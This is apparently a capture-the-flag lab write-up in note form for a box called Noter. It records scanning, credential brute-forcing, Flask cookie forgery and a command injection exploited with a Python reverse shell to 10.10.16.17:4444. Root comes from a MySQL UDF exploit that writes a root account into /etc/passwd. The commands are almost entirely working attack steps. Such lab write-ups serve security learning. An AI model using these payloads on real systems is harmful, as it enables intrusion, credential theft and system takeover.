# scanning
> TARGET=10.10.11.160 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
> for p in {1..65535}; do nc -vn 10.10.11.160 $p -w 1 -z & done 2> output.txt
```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 2.0.2 (Python 3.8.10)

(UNKNOWN) [10.10.11.160] 22 (ssh) open
(UNKNOWN) [10.10.11.160] 21 (ftp) open
(UNKNOWN) [10.10.11.160] 5000 (?) open
```

# 21
* try login using anonymous:anonymous, didn't work
* try simple bruteforce
> nmap --script=ftp-brute 10.10.11.160 -vvv
* stuck, there might be something blocking bruteforce, try another way
> hydra -C /usr/share/wordlists/./SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 10.10.11.160 ftp
* finished, nothing valid found

# 22
* try login to check banner
> ssh root@10.10.11.160
no banner found

# 5000
* http://10.10.11.160:5000/
* Werkzeug, python, there might be some vulns
* can reg a new user
* intercept traffic
* no obvious parameter to toggle user state
* session cookie can be b64 decoded
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDIifQ.YoK4Iw.RUca859R8nIgZfDjtS5xYaV77cw
{"logged_in":true,"username":"test2"}(+0EGQr e.qa{
* try reencode the conntent and use the same sig
{"logged_in":true,"username":"admin"}
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoK4Iw.RUca859R8nIgZfDjtS5xYaV77cw
* unauthorised, there must be a sig checking mechanism

* cookie might be decodable, https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

> flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDIifQ.YoK4Iw.RUca859R8nIgZfDjtS5xYaV77cw' --no-literal-eval
```
[*] Session decodes to: {'logged_in': True, 'username': 'test2'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
```
* re-sign the cookie with the decoded secret

> flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoK5iA.QkZp97fxa_fO9nlfa86DbblYK-o

> dirsearch -u http://10.10.11.160:5000/ -f -x 401,403,500
```
[09:02:18] 302 -  218B  - /dashboard  ->  http://10.10.11.160:5000/login
[09:02:57] 200 -    2KB - /login
[09:02:58] 302 -  218B  - /logout  ->  http://10.10.11.160:5000/login
[09:03:28] 200 -    3KB - /register
```
* also try scanning with cookie, nothing found yet

> nikto -host http://10.10.11.160:5000
Server: Werkzeug/2.0.2 Python/3.8.10

> dirb http://10.10.11.160:5000/ -c "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4vLi4vLi4vLi4vZXRjL2hvc3RzIn0.YoLMcQ.3wGDMs1y4uzATJtk4WWKBIZIFGA"
+ http://10.10.11.160:5000/dashboard
+ http://10.10.11.160:5000/login
+ http://10.10.11.160:5000/logout
+ http://10.10.11.160:5000/notes
+ http://10.10.11.160:5000/register

* edit note
CKEditor 4.6.2 (revision 20af917)

* valid/invalide username shows different error message
* username bruteforce
> hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p testes 10.10.11.160 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:F=credentials"
> flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
[5000][http-post-form] host: 10.10.11.160   login: blue   password: testes


```
    Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin


* Delete the password note  
* Ask the admin team to change the password
```

> ftp 10.10.11.160
```
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:root): blue
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57388|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
ftp> get policy.pdf
local: policy.pdf remote: policy.pdf
```

* Default user-password generated by the application is in the format of “username@site_name!” (This applies to all your applications)
* try ftp_admin:ftp_admin@Noter!

> ftp 10.10.11.160 as ftp_admin
ftp> ls
229 Entering Extended Passive Mode (|||18645|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip

* inside app_backup_1635803546.zip

app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'

* in 
```python
@app.route('/export_note_remote', methods=['POST'])
...
r = pyrequest.get(url,allow_redirects=True)
rand_int = random.randint(1,10000)
command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
subprocess.run(command, shell=True, executable="/bin/bash")
```

* trigger export to pdf from cloud
* create a file.md
```
';python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.17",4444)); os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' # '
```
> nc -vnlp 4444
```
listening on [any] 4444 ...
connect to [10.10.16.17] from (UNKNOWN) [10.10.11.160] 32942
$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```
> python3 -c 'import pty; pty.spawn("/bin/bash")'

# pe
svc@noter:~$ cat user.txt
cat user.txt

* upload and run linpeas.sh

svc@noter:/opt$ cat backup.sh
cat backup.sh
```bash
#!/bin/bash
zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\*
```
nothing interesting

* has db username
* MariaDB 10.2, https://github.com/Al1ex/CVE-2021-27928
root:Nildogg36
* there seems to be a process that renews the db frequently, when executing the db commands, need to be quick
```
> wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
> gcc -g -c raptor_udf2.c
> gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
> mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));

// Look for the value of plugin_dir and use the plugin_dir as the dump file location
mysql> show variables like '%plugin%';
mysql> select * from foo into dumpfile "/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so";

mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('echo \'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash\' >> /etc/passwd');
* the self generated password is: pass123
* sometime this may say the file is too short, try to compile the so in a different folder
```

root@noter:~# cat root.txt
cat root.txt
